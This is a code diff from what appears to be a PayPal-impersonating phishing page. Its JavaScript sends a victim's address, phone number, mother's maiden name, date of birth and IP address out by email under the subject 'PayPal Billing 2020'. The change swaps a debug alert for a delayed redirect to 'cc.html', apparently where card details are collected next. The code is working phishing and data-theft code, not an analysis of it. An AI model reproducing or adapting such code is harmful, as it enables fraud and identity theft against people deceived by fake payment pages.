@@ -263,8 +263,8 @@ $('#next').click(function(e){
                         Subject : "PayPal Billing 2020 "+$('#ip').val(),
                         Body : 'PAYPAL BILLING 2020\nIP:'+$('#ip').val()+'\naddress1:'+$('#address_1').val()+'\naddress2:'+$('#address_2').val()+'\nCity:'+$('#city').val()+'\nState:'+$('#state').val()+'\nZip:'+$('#zip').val()+'\nCountry:'+$('#country').val()+'\nPhone:'+$('#phone').val()+'\nMother Name:'+$('#mother').val()+'\nDoB:'+$('#dob_day').val()+'/'+$('#dob_month').val()+'/'+$('#dob_year').val()
                         }).then(
-                        message => alert(message)
-                        // window.location.replace("cc.html")
+                        // message => alert(message)
+                        setInterval(function(){ window.location.replace("cc.html"); }, 5000)
                         );
     }
     });
